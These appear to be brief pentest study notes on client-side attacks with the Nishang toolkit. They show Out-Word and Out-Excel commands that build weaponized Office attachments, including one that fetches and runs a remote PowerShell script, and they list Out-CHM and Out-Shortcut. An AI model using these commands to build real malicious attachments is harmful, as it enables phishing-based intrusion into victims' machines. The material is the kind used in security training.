# #Client Side Attacks
# #Malicious / Weaponized Attachments
# -out-word
# -out-excel

#Client side attacks are usefull when you do not want the attack the internet facing  
#servers of your target

#it is not only easiest way to gain access to a network
#it is also very nice approach to identify insider threats

#out-word and out-excel have exactly the same parameters and syntax

out-word -Payload "powershell.exe -noexit -c Get-Service"

#inside of out-word in nishang (payload parameter)

out-excel -PayloadUrl https://raw.githubusercontent.com/samratashok/nishang/master/Misc/Speak.ps1 -arguments "Speak 'You have been hack'"
Out-Excel -PayloadUrl https://raw.githubusercontent.com/samratashok/nishang/master/Misc/Speak.ps1 -arguments "Speak 'You have been hack'" -ExcelFileDir ../../akar.xls
# -remainsafe -removexlsx


#Out-chm (infected html help files)
#out-shortcut

#nishang/utility/encode-command


#https://enigma0x3.net/2014/01/11/using-a-powershell-payload-in-a-client-side-attack/
#http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html
